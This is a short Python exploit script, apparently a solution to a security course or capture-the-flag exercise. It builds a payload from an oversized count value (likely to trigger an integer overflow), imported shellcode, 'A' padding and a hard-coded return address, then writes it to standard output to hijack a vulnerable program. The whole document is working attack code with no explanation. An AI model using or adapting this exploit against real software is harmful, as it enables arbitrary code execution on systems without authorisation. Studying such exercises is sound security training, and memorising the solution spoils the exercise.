import sys
import struct
from shellcode import shellcode

shell_address = struct.pack('<I', 0xfff6e080)

padding_num = 0x3c - len(shellcode) 

count = struct.pack('<I', 0x40000004)

exploit_string = count + shellcode + (b'A' * padding_num) + shell_address

sys.stdout.buffer.write(exploit_string)
